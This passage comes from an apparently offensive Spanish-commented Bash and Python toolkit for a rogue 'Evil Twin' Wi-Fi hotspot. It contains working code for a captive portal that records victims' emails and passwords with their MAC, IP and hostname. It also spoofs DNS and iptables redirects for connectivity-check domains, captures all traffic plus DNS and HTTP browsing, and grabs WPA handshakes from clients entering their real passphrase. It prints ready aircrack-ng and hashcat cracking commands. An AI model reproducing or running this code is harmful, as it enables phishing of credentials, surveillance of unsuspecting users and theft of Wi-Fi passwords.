                        # Asegurar que el directorio del archivo existe
                        os.makedirs(os.path.dirname(EMAILS_FILE), exist_ok=True)
                        
                        # Guardar credenciales
                        with open(EMAILS_FILE, 'a') as f:
                            if password:
                                credential_line = f"{timestamp}|{site}|{email}|{password}|{mac}|{client_ip}|{hostname}\n"
                            else:
                                credential_line = f"{timestamp}|{email}|{mac}|{client_ip}|{hostname}\n"
                            f.write(credential_line)
                            f.flush()  # Forzar escritura inmediata
                        print(f"[+] Credenciales guardadas: {credential_line.strip()}")
                        print(f"[+] Archivo: {EMAILS_FILE}")
                        
                        # Crear directorio si no existe
                        os.makedirs(os.path.dirname(AUTHORIZED_MACS_FILE), exist_ok=True)
                        
                        # Autorizar MAC
                        with open(AUTHORIZED_MACS_FILE, 'a') as f:
                            f.write(f"{mac}\n")
                            f.flush()
                        print(f"[+] MAC autorizada: {mac}")
                        
                        print(f"[+] Email capturado: {email} | MAC: {mac} | IP: {client_ip}")
                        print(f"[+] Archivo: {EMAILS_FILE}")
                    except Exception as e:
                        print(f"[!] Error guardando email: {e}")
                    
                    # Autorizar MAC para acceso completo a Internet
                    try:
                        print(f"[+] Autorizando MAC: {mac} para acceso completo")
                        
                        # Obtener la interfaz del hotspot desde las variables de entorno
                        import os
                        hotspot_interface = os.environ.get('HOTSPOT_INTERFACE', 'wlan0')
                        
                        print(f"[DEBUG] Usando interfaz: {hotspot_interface}")
                        
                        # 1. CRÍTICO: Permitir NAT bypass para esta MAC (saltar redirecciones del portal)
                        result1 = subprocess.run([
                            'sudo', 'iptables', '-t', 'nat', '-I', 'PREROUTING', '1', 
                            '-i', hotspot_interface, '-m', 'mac', '--mac-source', mac, '-j', 'ACCEPT'
                        ], capture_output=True, text=True, timeout=10)
                        
                        # 2. Permitir FORWARD completo para esta MAC (antes de la regla DROP)
                        result2 = subprocess.run([
                            'sudo', 'iptables', '-I', 'FORWARD', '1', 
                            '-i', hotspot_interface, '-m', 'mac', '--mac-source', mac, '-j', 'ACCEPT'
                        ], capture_output=True, text=True, timeout=10)
                        
                        # 3. Permitir FORWARD de retorno para esta MAC
                        result3 = subprocess.run([
                            'sudo', 'iptables', '-I', 'FORWARD', '1', 
                            '-o', hotspot_interface, '-m', 'mac', '--mac-destination', mac, '-j', 'ACCEPT'
                        ], capture_output=True, text=True, timeout=10)
                        
                        # 4. Permitir INPUT desde esta MAC
                        result4 = subprocess.run([
                            'sudo', 'iptables', '-I', 'INPUT', '1', 
                            '-i', hotspot_interface, '-m', 'mac', '--mac-source', mac, '-j', 'ACCEPT'
                        ], capture_output=True, text=True, timeout=10)
                        
                        # Verificar resultados
                        if (result1.returncode == 0 and result2.returncode == 0 and 
                            result3.returncode == 0 and result4.returncode == 0):
                            print(f"[+] ✅ MAC {mac} autorizada correctamente para Internet completo")
                        else:
                            print(f"[!] ⚠️  Errores en autorización:")
                            if result1.returncode != 0:
                                print(f"    NAT bypass: {result1.stderr}")
                            if result2.returncode != 0:
                                print(f"    FORWARD salida: {result2.stderr}")
                            if result3.returncode != 0:
                                print(f"    FORWARD entrada: {result3.stderr}")
                            if result4.returncode != 0:
                                print(f"    INPUT: {result4.stderr}")
                                
                        # Verificación final: mostrar reglas críticas
                        print(f"[DEBUG] Verificando reglas para MAC {mac} en interfaz {hotspot_interface}:")
                        
                        # Mostrar las primeras reglas NAT para confirmar que se insertó correctamente
                        try:
                            nat_result = subprocess.run(['sudo', 'iptables', '-t', 'nat', '-L', 'PREROUTING', '-n', '--line-numbers'], 
                                                       capture_output=True, text=True, timeout=5)
                            print("[DEBUG] Primeras reglas NAT PREROUTING:")
                            for i, line in enumerate(nat_result.stdout.split('\n')[:8]):
                                print(f"  {line}")
                        except:
                            pass
                            
                        # Mostrar las primeras reglas FORWARD
                        try:
                            forward_result = subprocess.run(['sudo', 'iptables', '-L', 'FORWARD', '-n', '--line-numbers'], 
                                                           capture_output=True, text=True, timeout=5)
                            print("[DEBUG] Primeras reglas FORWARD:")
                            for i, line in enumerate(forward_result.stdout.split('\n')[:8]):
                                print(f"  {line}")
                        except:
                            pass
                        
                        # Test básico de conectividad
                        print(f"[+] ✅ MAC {mac} debería tener acceso completo a Internet ahora")
                        print(f"[+] 🌐 Prueba abrir google.com o cualquier sitio web desde el dispositivo")
                        
                    except Exception as e:
                        print(f"[!] ❌ Error crítico configurando iptables: {e}")
                        print(f"[!] MAC {mac} NO tendrá acceso a Internet")
                    
                    # Respuesta exitosa
                    print(f"[+] ✅ Autorización completa para {email} | MAC: {mac}")
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Cache-Control', 'no-cache')
                    self.end_headers()
                    response = {'success': True, 'message': 'Acceso autorizado', 'mac': mac}
                    self.wfile.write(json.dumps(response).encode())
                else:
                    self.send_response(400)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': False, 'error': 'Invalid data'}).encode())
            except Exception as e:
                print(f"[!] Error: {e}")
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
    
    def get_mac_from_ip(self, ip):
        # Buscar en la tabla ARP
        with open('/proc/net/arp', 'r') as f:
            for line in f.readlines()[1:]:
                parts = line.strip().split()
                if len(parts) >= 4 and parts[0] == ip:
                    return parts[3]
        return "00:00:00:00:00:00"  # MAC desconocida
        
    def get_hostname_from_ip(self, ip):
        # Intentar obtener el hostname con gethostbyaddr
        import socket
        import subprocess
        import re
        
        # Método 1: Usar gethostbyaddr
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            if hostname != ip:
                return hostname
        except (socket.herror, socket.gaierror):
            pass
            
        # Método 2: Buscar en los leases de dnsmasq
        try:
            with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 5 and parts[2] == ip:
                        if parts[3] != '*' and parts[3].lower() != 'unknown' and parts[3] != ip:
                            return parts[3]
        except:
            pass
            
        # Método 3: Intentar con nbtscan para dispositivos Windows
        try:
            result = subprocess.check_output(['nbtscan', ip], stderr=subprocess.DEVNULL, timeout=1).decode('utf-8', errors='ignore')
            match = re.search(r'\b[A-Za-z0-9_-]{2,63}\b', result)
            if match and match.group(0) != ip:
                return match.group(0)
        except:
            pass
            
        # Método 4: Intentar con arp para encontrar el fabricante
        try:
            with open('/proc/net/arp', 'r') as f:
                for line in f.readlines()[1:]:
                    parts = line.strip().split()
                    if len(parts) >= 6 and parts[0] == ip:
                        mac = parts[3].upper()
                        vendor = mac.split(':')[0:3]
                        vendor_str = '-'.join(vendor)
                        if vendor_str != '00-00-00':
                            return f"device-{vendor_str}"
        except:
            pass
            
        return "unknown-host"  # Hostname desconocido
    
    def log_message(self, format, *args):
        # Mostrar logs HTTP para debug
        print(f"[HTTP] {format % args}")

if __name__ == '__main__':
    # Crear directorios necesarios
    os.makedirs(os.path.dirname(EMAILS_FILE), exist_ok=True)
    os.makedirs(os.path.dirname(AUTHORIZED_MACS_FILE), exist_ok=True)
    os.makedirs(PORTAL_DIR, exist_ok=True)
    
    server = HTTPServer(('0.0.0.0', PORT), CaptivePortalHandler)
    print(f"[+] Servidor del portal cautivo iniciado en puerto {PORT}")
    print(f"[+] Sirviendo archivos desde: {PORTAL_DIR}")
    print(f"[+] Guardando credenciales en: {EMAILS_FILE}")
    server.serve_forever()
PYEOF
    
    chmod +x "$OUTPUT_DIR/captive_server.py"
    
    # Iniciar servidor con todos los parámetros en orden
    # Args: EMAILS_FILE, AUTHORIZED_MACS_FILE, HOTSPOT_IP, PORTAL_DIR, CAPTIVE_DOMAIN, PORT, REDIRECT_URL, HOTSPOT_INTERFACE
    python3 "$OUTPUT_DIR/captive_server.py" "$CAPTIVE_EMAILS_FILE" "$AUTHORIZED_MACS_FILE" "$HOTSPOT_IP" "$OUTPUT_DIR/captive_portal" "$CAPTIVE_DOMAIN" "$CAPTIVE_PORT" "$CAPTIVE_REDIRECT" "$HOTSPOT_INTERFACE" > "$OUTPUT_DIR/captive_server.log" 2>&1 &
    CAPTIVE_SERVER_PID=$!
    
    sleep 2
    
    if ps -p $CAPTIVE_SERVER_PID > /dev/null 2>&1; then
        success "Servidor del portal cautivo iniciado (PID: $CAPTIVE_SERVER_PID)"
        return 0
    else
        error "Falló al iniciar servidor del portal cautivo"
        cat "$OUTPUT_DIR/captive_server.log"
        return 1
    fi
}

# Configurar iptables para portal cautivo
configure_captive_portal_iptables() {
    log "Configurando iptables para portal cautivo..."
    
    # Limpiar reglas existentes
    iptables -t nat -F
    iptables -F FORWARD
    iptables -F INPUT
    
    # Habilitar IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # === TABLA NAT ===
    # Las MACs autorizadas se insertarán aquí con -I (al inicio)
    
    # Permitir tráfico al servidor del portal cautivo
    iptables -t nat -A PREROUTING -i $HOTSPOT_INTERFACE -p tcp -d $HOTSPOT_IP --dport $CAPTIVE_PORT -j ACCEPT
    
    # Permitir DNS
    iptables -t nat -A PREROUTING -i $HOTSPOT_INTERFACE -p udp --dport 53 -j ACCEPT
    
    # Redirigir HTTP (puerto 80) al portal cautivo
    iptables -t nat -A PREROUTING -i $HOTSPOT_INTERFACE -p tcp --dport 80 -j DNAT --to-destination $HOTSPOT_IP:$CAPTIVE_PORT
    
    # Redirigir HTTPS (puerto 443) al portal cautivo
    iptables -t nat -A PREROUTING -i $HOTSPOT_INTERFACE -p tcp --dport 443 -j DNAT --to-destination $HOTSPOT_IP:$CAPTIVE_PORT
    
    # Redirecciones para detectores de portal cautivo (Android, iOS, Windows)
    iptables -t nat -A PREROUTING -i $HOTSPOT_INTERFACE -p tcp -d connectivitycheck.android.com --dport 80 -j DNAT --to-destination $HOTSPOT_IP:$CAPTIVE_PORT
    iptables -t nat -A PREROUTING -i $HOTSPOT_INTERFACE -p tcp -d connectivitycheck.gstatic.com --dport 80 -j DNAT --to-destination $HOTSPOT_IP:$CAPTIVE_PORT
    iptables -t nat -A PREROUTING -i $HOTSPOT_INTERFACE -p tcp -d www.google.com --dport 80 -j DNAT --to-destination $HOTSPOT_IP:$CAPTIVE_PORT
    iptables -t nat -A PREROUTING -i $HOTSPOT_INTERFACE -p tcp -d captive.apple.com --dport 80 -j DNAT --to-destination $HOTSPOT_IP:$CAPTIVE_PORT
    iptables -t nat -A PREROUTING -i $HOTSPOT_INTERFACE -p tcp -d www.msftncsi.com --dport 80 -j DNAT --to-destination $HOTSPOT_IP:$CAPTIVE_PORT
    
    # NAT para salida a internet (MASQUERADE)
    iptables -t nat -A POSTROUTING -o $INTERNET_INTERFACE -j MASQUERADE
    
    # === TABLA FILTER (FORWARD) ===
    # Las MACs autorizadas se insertarán aquí con -I (al inicio)
    
    # Permitir tráfico establecido y relacionado
    iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
    
    # Permitir DNS
    iptables -A FORWARD -i $HOTSPOT_INTERFACE -p udp --dport 53 -j ACCEPT
    
    # Permitir tráfico al servidor del portal
    iptables -A FORWARD -i $HOTSPOT_INTERFACE -d $HOTSPOT_IP -p tcp --dport $CAPTIVE_PORT -j ACCEPT
    
    # Permitir ICMP para pruebas de conectividad (ping)
    iptables -A FORWARD -i $HOTSPOT_INTERFACE -p icmp --icmp-type echo-request -j ACCEPT
    
    # Permitir el resto del tráfico para MACs autorizadas (se agregan dinámicamente)
    # IMPORTANTE: Bloquear tráfico no autorizado AL FINAL
    iptables -A FORWARD -i $HOTSPOT_INTERFACE -j DROP  # Bloquear todo lo no autorizado
    
    info "Configuración de iptables completada - Las MACs autorizadas tendrán acceso completo"
    
    # === TABLA INPUT ===
    # Permitir tráfico al servidor del portal
    iptables -A INPUT -i $HOTSPOT_INTERFACE -p tcp --dport $CAPTIVE_PORT -j ACCEPT
    iptables -A INPUT -i $HOTSPOT_INTERFACE -p udp --dport 53 -j ACCEPT
    iptables -A INPUT -i $HOTSPOT_INTERFACE -p udp --dport 67 -j ACCEPT
    
    # Permitir ping y ICMP para pruebas de conectividad
    iptables -A INPUT -i $HOTSPOT_INTERFACE -p icmp --icmp-type echo-request -j ACCEPT
    
    success "iptables configurado para portal cautivo"
    info "Las MACs autorizadas se agregarán dinámicamente al inicio de las cadenas"
}

# Configurar dnsmasq (DHCP + DNS)
configure_dnsmasq() {
    if $SPOOF_MODE; then
        # Usar configuración con spoofing
        configure_dnsmasq_with_spoofing
    else
        # Configuración normal sin spoofing
        log "Configurando DHCP y DNS (modo normal)..."
        
        cat > "$DNSMASQ_CONF" << EOF
# Interfaz
interface=$HOTSPOT_INTERFACE
bind-interfaces

# DHCP
dhcp-range=$DHCP_RANGE,12h
dhcp-option=3,$HOTSPOT_IP
dhcp-option=6,$HOTSPOT_IP
dhcp-authoritative

# DNS
server=8.8.8.8
server=8.8.4.4
no-resolv

# Logging
log-queries
log-dhcp
log-facility=$DNS_LOG

# Otros
no-hosts
EOF

        # Si el portal cautivo está activo, agregar resolución del dominio ficticio
        if $CAPTIVE_PORTAL; then
            echo "# Portal Cautivo - Resolver dominio ficticio" >> "$DNSMASQ_CONF"
            echo "address=/$CAPTIVE_DOMAIN/$HOTSPOT_IP" >> "$DNSMASQ_CONF"
            
            # Resolver dominios de detección de portal cautivo
            echo "address=/connectivitycheck.android.com/$HOTSPOT_IP" >> "$DNSMASQ_CONF"
            echo "address=/connectivitycheck.gstatic.com/$HOTSPOT_IP" >> "$DNSMASQ_CONF"
            echo "address=/www.google.com/$HOTSPOT_IP" >> "$DNSMASQ_CONF"
            echo "address=/clients3.google.com/$HOTSPOT_IP" >> "$DNSMASQ_CONF"
            echo "address=/captive.apple.com/$HOTSPOT_IP" >> "$DNSMASQ_CONF"
            echo "address=/www.msftncsi.com/$HOTSPOT_IP" >> "$DNSMASQ_CONF"
            echo "address=/detectportal.firefox.com/$HOTSPOT_IP" >> "$DNSMASQ_CONF"
            
            info "Dominio ficticio configurado: $CAPTIVE_DOMAIN -> $HOTSPOT_IP"
            info "Dominios de detección de portal cautivo configurados"
        fi

        success "DHCP/DNS configurado"
    fi
}

# Configurar NAT y forwarding
configure_nat() {
    log "Configurando NAT y IP forwarding..."
    
    # Habilitar IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Limpiar reglas existentes
    iptables --flush
    iptables -t nat --flush
    
    # Configurar NAT (compartir Internet)
    iptables -t nat -A POSTROUTING -o "$INTERNET_INTERFACE" -j MASQUERADE
    iptables -A FORWARD -i "$INTERNET_INTERFACE" -o "$HOTSPOT_INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
    iptables -A FORWARD -i "$HOTSPOT_INTERFACE" -o "$INTERNET_INTERFACE" -j ACCEPT
    
    # Logging de conexiones
    iptables -A FORWARD -j LOG --log-prefix "HOTSPOT_FORWARD: " --log-level 4
    
    success "NAT configurado - Internet compartido"
}

# Iniciar captura de tráfico
start_traffic_capture() {
    log "Iniciando captura de tráfico..."
    
    # Capturar todo el tráfico
    tcpdump -i "$HOTSPOT_INTERFACE" -w "$TRAFFIC_PCAP" -U &
    TCPDUMP_PID=$!
    
    success "Captura de tráfico iniciada (PID: $TCPDUMP_PID)"
}

# Captura específica de handshakes WPA
start_handshake_capture() {
    if [[ -n "$HOTSPOT_PASSWORD" ]]; then
        log "Iniciando captura de handshakes WPA..."
        
        # Crear archivo de captura específico para handshakes
        HANDSHAKE_CAP="$OUTPUT_DIR/handshake_${HOTSPOT_SSID}_${TIMESTAMP}.cap"
        
        # Capturar frames EAPOL (handshake) de forma simple y efectiva
        tcpdump -i "$HOTSPOT_INTERFACE" -w "$HANDSHAKE_CAP" -U 'ether proto 0x888e' 2>/dev/null &
        HANDSHAKE_TCPDUMP_PID=$!
        
        # También capturar con tshark como backup
        tshark -i "$HOTSPOT_INTERFACE" -w "${HANDSHAKE_CAP}.tshark" -f "ether proto 0x888e" 2>/dev/null &
        HANDSHAKE_TSHARK_PID=$!
        
        # Monitorear hostapd.log para detectar PSK-MISMATCH (indica handshake capturado)
        (
            tail -f "$OUTPUT_DIR/hostapd.log" 2>/dev/null | while read line; do
                if echo "$line" | grep -q "AP-STA-POSSIBLE-PSK-MISMATCH"; then
                    mac=$(echo "$line" | grep -oP 'AP-STA-POSSIBLE-PSK-MISMATCH \K[0-9a-f:]+')
                    if [[ -n "$mac" ]]; then
                        timestamp=$(date '+%Y-%m-%d %H:%M:%S')
                        echo "[$timestamp] HANDSHAKE_CAPTURED: $mac" >> "$LOG_FILE"
                        echo ""
                        success "¡HANDSHAKE CAPTURADO!"
                        success "Cliente: $mac"
                        success "SSID: $HOTSPOT_SSID"
                        success "Archivo: $HANDSHAKE_CAP"
                        echo ""
                        info "El cliente intentó conectarse con SU contraseña real"
                        
                        # Extraer y mostrar el hash directamente
                        sleep 3  # Esperar a que el archivo se escriba completamente
                        local hash_file="$OUTPUT_DIR/hash_${mac//:/}.22000"
                        local aircrack_output="$OUTPUT_DIR/aircrack_${mac//:/}.txt"
                        
                        # Verificar ambos archivos de captura
                        local handshake_found=false
                        local working_file=""
                        
                        # Probar archivo principal
                        if aircrack-ng "$HANDSHAKE_CAP" 2>/dev/null | grep -q "1 handshake"; then
                            handshake_found=true
                            working_file="$HANDSHAKE_CAP"
                        # Probar archivo de tshark
                        elif [[ -f "${HANDSHAKE_CAP}.tshark" ]] && aircrack-ng "${HANDSHAKE_CAP}.tshark" 2>/dev/null | grep -q "1 handshake"; then
                            handshake_found=true
                            working_file="${HANDSHAKE_CAP}.tshark"
                        fi
                        
                        if $handshake_found; then
                            success "HANDSHAKE VALIDO DETECTADO con aircrack-ng"
                            
                            success "Usando archivo: $working_file"
                            
                            # Intentar extraer con hcxpcapngtool del archivo que funciona
                            if command -v hcxpcapngtool &> /dev/null; then
                                if hcxpcapngtool -o "$hash_file" "$working_file" 2>/dev/null; then
                                    if [[ -s "$hash_file" ]]; then
                                        echo ""
                                        success "HASH EXTRAIDO:"
                                        echo -e "${CYAN}╔════════════════════════════════════════════════════════════════════════════════╗${NC}"
                                        local hash_content=$(cat "$hash_file")
                                        echo -e "${YELLOW}$hash_content${NC}"
                                        echo -e "${CYAN}╚════════════════════════════════════════════════════════════════════════════════╝${NC}"
                                        echo ""
                                        info "Hash copiable arriba"
                                        info "Tambien guardado en: $hash_file"
                                    fi
                                fi
                            fi
                            
                            # Si hcxpcapngtool falla, mostrar info de aircrack-ng
                            if [[ ! -s "$hash_file" ]]; then
                                warning "hcxpcapngtool no pudo extraer el hash, pero aircrack-ng SÍ detectó handshake"
                                info "Usa aircrack-ng directamente:"
                                echo -e "${YELLOW}aircrack-ng -w /usr/share/wordlists/rockyou.txt \"$working_file\"${NC}"
                            fi
                        else
                            # Verificar contenido del archivo
                            local file_size=$(stat -f%z "$HANDSHAKE_CAP" 2>/dev/null || stat -c%s "$HANDSHAKE_CAP" 2>/dev/null)
                            if [[ $file_size -gt 100 ]]; then
                                warning "Archivo capturado ($file_size bytes) pero sin handshake WPA válido"
                                info "El cliente puede estar cancelando la conexión antes del handshake"
                            else
                                warning "Archivo de captura muy pequeño ($file_size bytes)"
                                warning "Posible problema con la captura de tráfico"
                            fi
                        fi
                        
                        echo ""
                        info "Para crackear la contraseña:"
                        echo -e "${YELLOW}aircrack-ng -w /usr/share/wordlists/rockyou.txt \"$HANDSHAKE_CAP\"${NC}"
                        echo ""
                        info "O con hashcat (más rápido):"
                        if [[ -s "$hash_file" ]]; then
                            echo -e "${YELLOW}hashcat -m 22000 \"$hash_file\" /usr/share/wordlists/rockyou.txt${NC}"
                        else
                            echo -e "${YELLOW}hcxpcapngtool -o hash_${mac//:/}.22000 \"$HANDSHAKE_CAP\"${NC}"
                            echo -e "${YELLOW}hashcat -m 22000 hash_${mac//:/}.22000 /usr/share/wordlists/rockyou.txt${NC}"
                        fi
                        echo ""
                        
                        # Guardar comando en archivo
                        cat >> "$OUTPUT_DIR/crack_commands.txt" << EOF
# Handshake capturado: $(date)
# Cliente: $mac
# SSID: $HOTSPOT_SSID
# Archivo: $HANDSHAKE_CAP

# Aircrack-ng:
aircrack-ng -w /usr/share/wordlists/rockyou.txt "$HANDSHAKE_CAP"

# Hashcat:
hcxpcapngtool -o hash_${mac//:/}.22000 "$HANDSHAKE_CAP"
hashcat -m 22000 hash_${mac//:/}.22000 /usr/share/wordlists/rockyou.txt

---

EOF
                        log "Comandos de crackeo guardados en: $OUTPUT_DIR/crack_commands.txt"
                    fi
                fi
            done
        ) &
        
        success "Captura de handshakes iniciada"
        info "Archivo: $HANDSHAKE_CAP"
        warning "Cuando alguien intente conectarse con contraseña incorrecta, se capturará el handshake"
        
        # Iniciar captura de handshakes parciales (M1/M2)
        start_partial_handshake_capture
    fi
}

# Captura de handshakes parciales (M1/M2) - método correcto
start_partial_handshake_capture() {
    log "Iniciando captura de handshakes parciales (M1/M2)..."
    info "Evil Twin configurado con PSK incorrecta - capturará M1/M2 automáticamente"
    
    # Monitorear fallos de MIC (indica que M2 fue capturado)
    (
        tail -f "$OUTPUT_DIR/hostapd.log" 2>/dev/null | while read line; do
            # Detectar fallo de MIC = M2 capturado con PSK real del cliente
            if echo "$line" | grep -q "AP-STA-POSSIBLE-PSK-MISMATCH"; then
                mac=$(echo "$line" | grep -oP 'AP-STA-POSSIBLE-PSK-MISMATCH \K[0-9a-f:]+')
                if [[ -n "$mac" ]]; then
                    success "HANDSHAKE PARCIAL CAPTURADO (M1/M2)"
                    success "Cliente: $mac"
                    success "El cliente envió M2 con su PSK real"
                    
                    # Verificar que tenemos frames EAPOL en el archivo
                    sleep 2
                    local file_size=$(stat -c%s "$HANDSHAKE_CAP" 2>/dev/null || echo "0")
                    
                    if [[ $file_size -gt 100 ]]; then
                        success "Archivo de captura: $file_size bytes"
                        
                        # Verificar con aircrack-ng si detecta handshake parcial
                        if aircrack-ng "$HANDSHAKE_CAP" 2>/dev/null | grep -q "handshake\|EAPOL"; then
                            success "HANDSHAKE VALIDO DETECTADO por aircrack-ng"
                            
                            # Extraer hash con hcxpcapngtool
                            local hash_file="/tmp/hash_${mac//:/}.22000"
                            if command -v hcxpcapngtool &> /dev/null; then
                                if hcxpcapngtool -o "$hash_file" "$HANDSHAKE_CAP" 2>/dev/null; then
                                    if [[ -s "$hash_file" ]]; then
                                        echo ""
                                        success "HASH EXTRAIDO (M1/M2):"
                                        echo -e "${CYAN}╔════════════════════════════════════════════════════════════════════════════════╗${NC}"
                                        local hash_content=$(cat "$hash_file")
                                        echo -e "${YELLOW}$hash_content${NC}"
                                        echo -e "${CYAN}╚════════════════════════════════════════════════════════════════════════════════╝${NC}"
                                        echo ""
                                        info "Hash copiable arriba"
                                        info "Tambien guardado en: $hash_file"
                                        
                                        # Guardar información del éxito
                                        echo "HANDSHAKE_PARCIAL_CAPTURADO=true" >> "$OUTPUT_DIR/handshake_success.txt"
                                        echo "MAC_CLIENTE=$mac" >> "$OUTPUT_DIR/handshake_success.txt"
                                        echo "HASH_FILE=$hash_file" >> "$OUTPUT_DIR/handshake_success.txt"
                                        echo "TIMESTAMP=$(date)" >> "$OUTPUT_DIR/handshake_success.txt"
                                    fi
                                fi
                            fi
                        else
                            info "ℹ️  Handshake parcial capturado, verificando con herramientas adicionales..."
                        fi
                    else
                        warning "Archivo de captura pequeño ($file_size bytes)"
                    fi
                    
                    echo ""
                    info "Para crackear la contraseña:"
                    echo -e "${YELLOW}aircrack-ng -w /usr/share/wordlists/rockyou.txt \"$HANDSHAKE_CAP\"${NC}"
                    echo ""
                    info "O con hashcat (más rápido):"
                    if [[ -s "$hash_file" ]]; then
                        echo -e "${YELLOW}hashcat -m 22000 \"$hash_file\" /usr/share/wordlists/rockyou.txt${NC}"
                    else
                        echo -e "${YELLOW}hcxpcapngtool -o hash.22000 \"$HANDSHAKE_CAP\"${NC}"
                        echo -e "${YELLOW}hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt${NC}"
                    fi
                    echo ""
                fi
            fi
        done
    ) &
    
    success "Captura de handshakes parciales activada"
    info "Cuando un cliente intente conectarse, se capturarán M1/M2 automáticamente"
}

# Monitorear clientes conectados
monitor_clients() {
    log "Iniciando monitoreo de clientes..."
    
    # Monitor de hostapd log (captura intentos de conexión)
    (
        tail -f "$OUTPUT_DIR/hostapd.log" 2>/dev/null | while read line; do
            timestamp=$(date '+%Y-%m-%d %H:%M:%S')
            
            # Detectar autenticación (intento de conexión)
            if echo "$line" | grep -q "authenticated"; then
                mac=$(echo "$line" | grep -oP 'STA \K[0-9a-f:]+')
                if [[ -n "$mac" ]]; then
                    echo "[$timestamp] AUTH_ATTEMPT: MAC=$mac" >> "$CLIENTS_FILE"
                    echo -e "\n${YELLOW}[AUTH ATTEMPT]${NC} MAC: $mac intentando conectarse..."
                fi
            fi
            
            # Detectar conexión exitosa
            if echo "$line" | grep -q "AP-STA-CONNECTED"; then
                mac=$(echo "$line" | grep -oP 'AP-STA-CONNECTED \K[0-9a-f:]+')
                if [[ -n "$mac" ]]; then
                    # Obtener vendor del MAC usando base de datos local
                    mac_prefix=$(echo "$mac" | cut -d: -f1-3 | tr '[:lower:]' '[:upper:]' | tr -d ':')
                    vendor=$(grep -i "^$mac_prefix" /usr/share/ieee-data/oui.txt 2>/dev/null | cut -f3 | head -1)
                    [[ -z "$vendor" ]] && vendor="Unknown"
                    
                    echo "[$timestamp] CONNECTED: MAC=$mac Vendor=$vendor" >> "$CLIENTS_FILE"
                    echo -e "\n${GREEN}[CONNECTED]${NC} MAC: $mac | Vendor: $vendor"
                fi
            fi
            
            # Detectar desconexión
            if echo "$line" | grep -q "AP-STA-DISCONNECTED"; then
                mac=$(echo "$line" | grep -oP 'AP-STA-DISCONNECTED \K[0-9a-f:]+')
                if [[ -n "$mac" ]]; then
                    echo "[$timestamp] DISCONNECTED: MAC=$mac" >> "$CLIENTS_FILE"
                    echo -e "\n${RED}[DISCONNECTED]${NC} MAC: $mac"
                fi
            fi
        done
    ) &
    
    # Monitor de ARP (captura IPs asignadas)
    (
        while true; do
            arp -an | grep "$HOTSPOT_INTERFACE" | while read line; do
                ip=$(echo "$line" | grep -oP '\(\K[^\)]+')
                mac=$(echo "$line" | grep -oP 'at \K[^ ]+')
                
                if [[ -n "$ip" ]] && [[ -n "$mac" ]]; then
                    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
                    
                    # Verificar si es una IP nueva para este MAC
                    if ! grep -q "$mac.*IP=$ip" "$CLIENTS_FILE" 2>/dev/null; then
                        echo "[$timestamp] IP_ASSIGNED: MAC=$mac IP=$ip" >> "$CLIENTS_FILE"
                        
                        # Intentar obtener hostname
                        hostname=$(timeout 2 nslookup "$ip" 2>/dev/null | grep "name =" | awk '{print $4}' | sed 's/\.$//' || echo "Unknown")
                        
                        echo "[$timestamp] OSINT: MAC=$mac Hostname=$hostname" >> "$CLIENTS_FILE"
                        echo -e "\n${CYAN}[IP ASSIGNED]${NC} MAC: $mac | IP: $ip | Hostname: $hostname"
                    fi
                fi
            done
            
            sleep 3
        done
    ) &
    MONITOR_PID=$!
    
    success "Monitor de clientes iniciado (PID: $MONITOR_PID)"
}

# Analizar tráfico DNS en tiempo real
analyze_dns_traffic() {
    log "Iniciando análisis de tráfico DNS..."
    
    (
        tshark -i "$HOTSPOT_INTERFACE" -Y "dns.qry.name" -T fields \
            -e frame.time -e ip.src -e dns.qry.name \
            2>/dev/null | while read timestamp ip domain; do
            if [[ -n "$domain" ]] && [[ "$domain" != "dns.qry.name" ]]; then
                echo "[$timestamp] $ip -> $domain" >> "$DNS_LOG"
                echo -e "${BLUE}[DNS]${NC} $ip consultó: ${CYAN}$domain${NC}"
            fi
        done
    ) &
    
    success "Análisis DNS iniciado"
}

# Analizar tráfico HTTP en tiempo real
analyze_http_traffic() {
    log "Iniciando análisis de tráfico HTTP..."
    
    (
        tshark -i "$HOTSPOT_INTERFACE" -Y "http.request" -T fields \
            -e frame.time -e ip.src -e http.host -e http.request.uri \
            2>/dev/null | while read timestamp ip host uri; do
            if [[ -n "$host" ]]; then
                echo "[$timestamp] $ip -> http://$host$uri" >> "$HTTP_LOG"
                echo -e "${MAGENTA}[HTTP]${NC} $ip visitó: ${YELLOW}http://$host$uri${NC}"
            fi
        done
    ) &
    
    success "Análisis HTTP iniciado"
}

# Generar reporte OSINT
generate_osint_report() {
    log "Generando reporte OSINT..."
    
    cat > "$OSINT_REPORT" << 'EOF'
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reporte OSINT - WiFi Hotspot</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 30px;
        }
        h1 {
            color: #333;
            border-bottom: 3px solid #4CAF50;
            padding-bottom: 10px;
            margin-bottom: 30px;
        }
        h2 {
            color: #555;
            margin-top: 30px;
            margin-bottom: 15px;
            border-left: 4px solid #2196F3;
            padding-left: 10px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        .stat-card h3 {
            font-size: 36px;
            margin-bottom: 5px;
        }
        .stat-card p {
            opacity: 0.9;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }
        th, td {
            padding: 12px;
            text-align: left;
